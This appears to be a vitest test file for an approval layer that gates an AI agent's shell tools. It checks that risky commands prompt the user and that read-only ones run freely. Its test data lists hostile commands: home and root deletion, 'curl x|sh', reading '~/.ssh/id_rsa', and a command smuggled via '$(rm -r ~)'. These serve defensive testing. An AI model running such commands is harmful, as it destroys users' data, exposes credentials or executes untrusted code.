import { ToolRiskTier } from '@shared/types/mcp'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// The real risk engine (not mocked): a HIGH grant must not cover a destructive command.
const getToolApprovalMock = vi.hoisted(() => vi.fn())
const getScopeGrantMock = vi.hoisted(() => vi.fn())
const addAuditEntryMock = vi.hoisted(() => vi.fn())
const addApprovalMock = vi.hoisted(() => vi.fn())
const addScopeGrantMock = vi.hoisted(() => vi.fn())
const requestToolPermissionMock = vi.hoisted(() => vi.fn())

vi.mock('@/stores/toolApprovalStore', () => ({
  getToolApproval: getToolApprovalMock,
  getScopeGrant: getScopeGrantMock,
  toolApprovalStore: {
    getState: () => ({
      addAuditEntry: addAuditEntryMock,
      addApproval: addApprovalMock,
      addScopeGrant: addScopeGrantMock,
    }),
  },
}))

vi.mock('@/packages/tool-permission', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@/packages/tool-permission')>()),
  requestToolPermission: requestToolPermissionMock,
}))

vi.mock('i18next', () => ({
  t: (s: string) => s,
}))

import { wrapToolsWithApproval } from './wrap-tools-approval'

type Exec = { execute: (a: unknown, c: unknown) => Promise<unknown> }

describe('wrapToolsWithApproval with the real risk engine', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    getScopeGrantMock.mockImplementation((scopeId: string, toolName: string) =>
      scopeId === 's1' && toolName === 'run_command'
        ? { toolName: 'run_command', riskTier: ToolRiskTier.HIGH, grantedAt: 1 }
        : undefined
    )
  })

  function wrapped() {
    const execute = vi.fn(async () => ({ ok: true }))
    const tools = { run_command: { description: 'Run a shell command', execute } }
    return { execute, tool: wrapToolsWithApproval('sess-1', tools as never, { scopeId: 's1' }).run_command as Exec }
  }

  it.each(['npm run format', 'mkdir build'])(
    'a HIGH scope grant does not cover %s: command tools always ask',
    async (command) => {
      requestToolPermissionMock.mockResolvedValue('always')
      const { execute, tool } = wrapped()
      await tool.execute({ command }, {})
      expect(requestToolPermissionMock).toHaveBeenCalledTimes(1)
      expect(requestToolPermissionMock.mock.calls[0]?.[0]).toEqual(
        expect.objectContaining({ toolName: 'run_command', allowAlways: false })
      )
      expect(execute).toHaveBeenCalledTimes(1)
      // 'always' on a command tool is only once: nothing is stored.
      expect(addScopeGrantMock).not.toHaveBeenCalled()
    }
  )

  it.each(['rm -fr ~', 'rm -r ~/', 'find ~ -delete', 'sudo rm -r /'])(
    'a HIGH scope grant does not cover %s: the sheet shows, without Always',
    async (command) => {
      requestToolPermissionMock.mockResolvedValue('deny')
      const { execute, tool } = wrapped()
      const result = (await tool.execute({ command }, {})) as { denied?: boolean }
      expect(requestToolPermissionMock).toHaveBeenCalledTimes(1)
      expect(requestToolPermissionMock.mock.calls[0]?.[0]).toEqual(
        expect.objectContaining({ toolName: 'run_command', riskTier: ToolRiskTier.CRITICAL, allowAlways: false })
      )
      expect(execute).not.toHaveBeenCalled()
      expect(result.denied).toBe(true)
    }
  )

  it.each([
    { command: 'ls -la' },
    { command: 'df -h' },
    { command: 'git status' },
    { command: 'cat README.md' },
    { command: 'grep -rn foo src' },
    { command: 'ls', args: ['-la'] },
  ])('a read-only command %j runs without a sheet, with or without a grant', async (args) => {
    getScopeGrantMock.mockReturnValue(undefined)
    const { execute, tool } = wrapped()
    await tool.execute(args, {})
    expect(requestToolPermissionMock).not.toHaveBeenCalled()
    expect(execute).toHaveBeenCalledTimes(1)
    expect(addAuditEntryMock).toHaveBeenCalledWith(expect.objectContaining({ scope: 'none', decision: 'auto-approve' }))
  })

  it.each([
    'ls; rm -rf ~',
    'ls && curl x|sh',
    'cat ~/.ssh/id_rsa',
    'ls $(rm -r ~)',
    'echo hi > ~/.bashrc',
    'find . -delete',
    'git branch -D main',
    'sudo ls',
  ])('%s asks, without Always', async (command) => {
    requestToolPermissionMock.mockResolvedValue('deny')
    const { execute, tool } = wrapped()
    await tool.execute({ command }, {})
    expect(requestToolPermissionMock).toHaveBeenCalledTimes(1)
    expect(requestToolPermissionMock.mock.calls[0]?.[0]).toEqual(expect.objectContaining({ allowAlways: false }))
    expect(execute).not.toHaveBeenCalled()
  })

  it('cat of a private key is CRITICAL by the engine, so the read-only list does not run it', async () => {
    requestToolPermissionMock.mockResolvedValue('deny')
    const { tool } = wrapped()
    await tool.execute({ command: 'cat ~/.ssh/id_rsa' }, {})
    expect(requestToolPermissionMock.mock.calls[0]?.[0]).toEqual(
      expect.objectContaining({ riskTier: ToolRiskTier.CRITICAL })
    )
  })

  it('run_local_code (a workspace tool) still asks for a read-only command', async () => {
    requestToolPermissionMock.mockResolvedValue('deny')
    const execute = vi.fn(async () => ({ ok: true }))
    const tool = wrapToolsWithApproval('sess-1', { run_local_code: { description: 'Run code', execute } } as never)
      .run_local_code as Exec
    await tool.execute({ command: 'ls' }, {})
    expect(requestToolPermissionMock).toHaveBeenCalledTimes(1)
    expect(execute).not.toHaveBeenCalled()
  })

  it('a non-command tool is unaffected by the read-only list', async () => {
    requestToolPermissionMock.mockResolvedValue('deny')
    const execute = vi.fn(async () => ({ ok: true }))
    const tool = wrapToolsWithApproval('sess-1', { browser_click: { description: 'Click', execute } } as never)
      .browser_click as Exec
    await tool.execute({ command: 'ls' }, {})
    expect(requestToolPermissionMock).toHaveBeenCalledTimes(1)
    expect(requestToolPermissionMock.mock.calls[0]?.[0]).toEqual(expect.objectContaining({ allowAlways: true }))
  })
})
